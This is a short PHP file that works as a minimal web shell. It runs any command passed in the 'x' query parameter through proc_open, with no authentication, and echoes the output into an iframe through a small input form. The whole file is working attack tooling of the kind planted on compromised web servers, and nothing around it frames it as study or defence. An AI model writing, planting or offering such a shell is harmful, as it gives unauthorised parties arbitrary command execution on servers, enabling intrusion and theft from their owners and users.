<?php
if (isset($_GET['x'])) {
    $d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
    $p=proc_open($_GET['x'],$d,$pipes);
    if (is_resource($p)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]); proc_close($p);
    } exit;
}
?>
<form target="r"><input name="x" autofocus></form>
<iframe name="r"></iframe>